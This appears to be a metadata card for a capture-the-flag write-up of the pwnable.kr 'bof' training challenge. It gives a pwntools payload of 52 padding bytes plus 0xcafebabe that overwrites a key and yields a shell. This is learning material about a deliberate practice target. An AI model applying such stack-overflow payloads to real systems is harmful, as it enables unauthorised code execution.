---
title: [pwnable.kr] bof 题解
contest: pwnable.kr
year: 2025
difficulty: easy
vuln_type: rop
tags: [pwnable_kr, bof_buffer_overflow, canary_disabled, ssh_pwntools, simple_stack_smash, p32_key_overwrite, aslr_disabled_pwnable, classic_pwn_lesson, 13x4_52_byte_padding]
attack_chain: ssh bof@pwnable.kr:2222 password guest → process './bof' argv=['bof'] → key=0xcafebabe → payload = b'A' * 52 + p32(0xcafebabe) → overflow me : 触发覆盖 key → system("/bin/sh") 反弹
key_payload: bof = b'A'*13*4 + p32(0xcafebabe) / ssh('bof', 'pwnable.kr', password='guest', port=2222) / p.sendline(bof) / p.interactive()
one_liner: pwnable.kr 经典 bof 题：52 字节 (13 * 4) padding + p32(0xcafebabe) 覆盖 key → 触发 system("/bin/sh") 反弹 shell。
lesson: pwnable.kr bof 是 CTF PWN 入门经典题，无 canary + 无 PIE + ASLR 禁用，payload 直接覆盖 key 触发后门；pwntools ssh 模块一键连远程。
quality: high
---
